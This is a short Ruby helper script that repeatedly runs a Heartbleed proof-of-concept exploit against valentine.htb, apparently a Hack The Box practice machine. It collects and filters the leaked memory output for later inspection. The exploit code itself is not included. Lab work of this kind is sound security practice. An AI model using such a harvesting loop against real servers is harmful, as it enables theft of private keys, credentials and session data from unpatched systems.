#!/bin/env ruby

require 'pry'

CMD = 'python ./heartbleed-PoC/heartbleed-exploit.py valentine.htb'

def log(message, level = :debug)
  puts sprintf('[%s] [%5s] %s', Time.now.strftime('%H:%M.%S'), level.to_s.upcase!, message)
  exit(1) if level.eql?(:fatal)
end

def run(round)
  `#{CMD}`
  result = File.read('./out.txt').split("\n")
  clean =  result.reject { |l| l.scan(/00/).size >= 16 }
end

ceiling  = 100
interval = 2

results = Hash.new

0.upto(ceiling) do |round|
  output = run(round)
  results[round] = output
  log(sprintf('round[%3d] got[%d] lines', round, output.size))
  sleep(interval)
end

binding.pry
